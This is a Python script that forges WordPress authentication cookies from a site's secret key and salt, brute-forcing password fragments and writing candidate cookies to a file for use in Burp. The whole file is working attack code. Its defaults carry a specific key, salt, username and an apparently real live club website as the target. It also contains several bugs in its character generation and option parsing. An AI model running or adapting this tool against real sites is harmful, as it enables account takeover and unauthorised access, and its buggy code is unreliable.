#!/usr/bin/python
#
##############################################################################
# Title: 	WordPress Auth Cookie Generator Demo
# Author: 	Mike Czumak (T_v3rn1x) - @SecuritySift - securitysift.com
# Purpose: 	Generates WP auth cookies (requires valid Secret Key and Salt)
# License: 	You may modify and/or distribute freely, as long as it is not
# 			used maliciously or incorporated into any commercial product
##############################################################################

import hmac, hashlib, string, sys, getopt

# generate an md5 hash with salt in same manner as WP
def wp_hash(data, key, salt):
	wpsalt = key + salt
	hash =  hmac.new(wpsalt, data, hashlib.md5).hexdigest()
	return hash

# generate array of all 4 character password frags given a range of
# upper and lower case letters numbers 0-9, slash (/) and period (.)
def gen_pass_frag():

	lowerletters = list(map(chr, range(ord('a'), ord('Z')+1)))
	upperletters = list(map(chr, range(ord('A'), ord('Z')+1)))
	numbers = list(map(chr, range(ord('0'), ord('9')+1)))
	specchars = ['/', '.'];
	allchars = lowerletters + upperletters + numbers + specchars
	frags = ''; # hold concatenated list of all 4-char frag combos
	count = 0; # loop counter

	#generate all possible 4-character combinations for $pass_frag
	for f1 in allchars:
		for f2 in allchars:
			for f3 in allchars:
				for f4 in allchars:
					frags += f1+f2+f3+f4+',';
					count += 1;

	frags = frags.rstrip(',') # remove trailing comma
	frag_array = frags.split(','); # split list into an array for iteration

	return frag_array

# generate all possible cookies for a given user
def gen_cookies(username, expiration, pass_frag, key, salt, target):
	frag_array = []
	#scheme = 'auth' # default auth scheme for wp
	scheme = 'secure_auth'

	# generate password frag combinations or use single frag passed as arg
	if pass_frag == '':
		frag_array = gen_pass_frag()
	else:
		frag_array = [pass_frag]

	cookie_id = 'wordpress_' + hashlib.md5(target).hexdigest() + '='
	allcookies = '' # string to hold all generated cookies
	i = 0 # loop counter

	# loop through each generated pass frag and build key/hash/cookie
	for frag in frag_array:
		hashkey = wp_hash(username + frag + '|' + expiration, key, salt)
		hash = hmac.new(hashkey, username + '|' + expiration, hashlib.md5).hexdigest()
		cookie = str(i) + ':' + frag + ':' + cookie_id + username + '%7C' + expiration + '%7C' + hash + '\n'
		allcookies += cookie
		i+=1

	print ('\n[+] Cookie gen complete. ' + str(i) + ' cookie(s) created.');

	if i == 1:
		print '[+] Cookie: ' + allcookies.split(':')[2]
	else:
		# write cookies to file
		filename = cookie_id.split('_')[1].split('=')[0] + '_' + username + '_cookies.txt'
		f = open(filename, 'w')
		f.write(allcookies)
		f.close();
		print ('[+] Cookies written to file [' + filename + ']\n')


def main(argv):
	username = 'clubmaster' # default username
	pass_frag = '' # default is to generate pass frags
	expiration = '1577836800' # default expiration date (1/1/2020)
	key = '}nQu1A@UGy?mlT.{l9g}rc3xxC:2$,/KL_%[XZUJPl,)(C[U{Cs_?Nz;3]F~BYB@'
	salt = '!EurE[[1[^m3d(e} B#g5+oYSUFi:CL]7,jR{9W;zc%[7?[UfwU*G.;z!,+ygSKq'
	target = 'https://www.arsenaldoubleclub.co.uk'

	print "\nWordPress Auth Cookie Generator"
	print "Author: Mike Czumak (T_v3rn1x) - @SecuritySift - securitysift.com"
	print "Purpose: Generates WP auth cookies (requires valid Secret Key and Salt)"

	usage = '''\nUsage: wpcookiegen.py\n\nOptions:
	-u <username> (default is admin)
	-f <pass_frag> (default/blank will generate all combos)
	-e <expiration> (unix_date_stamp: default is 1/1/2020)
	-k <key> (default is DisclosedKey)
	-s <salt> (default is DisclosedSalt)
	-t <target> (default is http://localhost/wordpress)\n\nNotes:
	You can parse the cookie list directly in Burp with the following regex:
	^[0-9]*:[0-9a-zA-z\.\/]{4}:\n'''

	try:
		opts, args = getopt.getopt(argv,'hu:f:e:s:')
	except getopt.GetoptError:
		print usage
		sys.exit(2)

	for opt, arg in opts:
		if opt == '-h':
			print usage
			sys.exit()
		elif opt == '-u':
			username = arg
		elif opt == '-f':
			pass_frag = arg
		elif opt == '-e':
			expiration = arg
		elif opt =='-s':
			salt = arg
		elif opt == 'k':
			key = arg
		elif opt == 't':
			target == arg

	gen_cookies(username,expiration,pass_frag, key, salt, target)

if __name__ == '__main__':
	main(sys.argv[1:])
